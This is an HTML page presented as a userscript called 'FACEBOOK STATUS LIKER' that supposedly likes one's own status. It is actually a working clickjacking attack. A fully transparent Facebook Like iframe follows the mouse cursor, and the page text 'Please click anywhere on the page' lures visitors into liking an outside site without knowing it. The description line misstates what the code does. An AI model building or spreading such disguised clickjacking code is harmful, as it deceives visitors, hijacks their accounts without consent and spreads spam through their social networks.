// ==UserScript==
// @name           FACEBOOK STATUS LIKER
// @description    GOT THIS FROM MY FRIEND, LIKES YOUR OWN STATUS AUTOMATICALLY BY SUBSCRIBERS
// ==/UserScript==



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Facebook Auto Like Script</title>

<script src="jquery-1.4.2.min.js" type="text/javascript"></script>
<script type="text/javascript">
var interval;
$(function()
{
interval=setInterval("updateActiveElement();", 50);
});

function updateActiveElement()
{
if ( $(document.activeElement).attr('id')=="fbframe" )
{
clearInterval(interval);
iflag=1;
}
}

</script>
</head>

<body>



<!--page content goes here-->
<h2>Please click anywhere on the page.</h2>

<p>Now check your facebook wall </p>
. <img src="http://i-am-totally-bored.com/wp-content/uploads/2010/06/article-1290060-0A_1074762a.jpg" />


<!-- end of page content (but don't close your html or body tag here)-->


<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">


<!--facebook like frame code goes here-->

<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fi-am-totally-bored.com%2F&amp%3Blayout=standard&amp%3Bshow_faces=false&amp%3Bwidth=450&amp%3Baction=like&amp%3Bfont=tahoma&amp%3Bcolorscheme=light&amp%3Bheight=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>

<!--end facebook like frame code-->

</div>


<script>
var iflag = 0;
var icontainer = document.getElementById('icontainer');
var standardbody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body //create reference to common "body" across doctypes



function mouseFollower(e){
/* DO NOT EDIT THIS */
if (window.event)
{ // for IE
icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px';
icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px';
}
else
{
icontainer.style.top = (e.pageY-5)+'px';
icontainer.style.left = (e.pageX-5)+'px';
}

}
document.onmousemove = function(e) {
if (iflag == 0) {mouseFollower(e);}
}

</script>

</body>
</html>